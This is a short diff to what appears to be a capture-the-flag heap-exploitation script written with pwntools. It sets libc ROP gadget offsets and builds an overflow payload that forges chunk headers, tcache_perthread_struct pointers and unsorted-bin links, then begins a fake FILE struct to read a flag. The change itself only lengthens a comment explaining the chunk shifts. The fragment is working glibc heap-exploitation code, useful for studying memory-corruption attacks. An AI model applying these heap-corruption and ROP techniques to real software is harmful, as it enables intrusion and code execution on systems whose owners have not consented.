@@ -94,7 +94,7 @@ rdx = libc.address + 0x12bda6
 rax = libc.address + 0x47cf8
 syscall = libc.address + 0xcf6c5
 xchg_eax_edi = libc.address + 0x145585
-# Upgrade [1] to setup step 4
+# Upgrade [1] to setup step 4, note that here we shifted [2] and [3] downward by 0x10 bytes, so that pointers in tcache_perthread_struct points at their metadata
 upgrade(1, flag.ljust(0x90, "B") + p64(0) + p64(0x21) + p64(fourth) + p64(fake) + p64(0x20) + p64(0x70) + 'B'*0x60 + p64(0) + p64(0x31) + p64(fake) + p64(unsorted_head) + p64(0) * 2 + p64(0x30) + p64(0x60) + 'B'*0x40 + p64(0) + p64(0x4c1) + p64(unsorted_head) + p64(second))
 flag_addr = first + 0x10
 # Build fake FILE struct
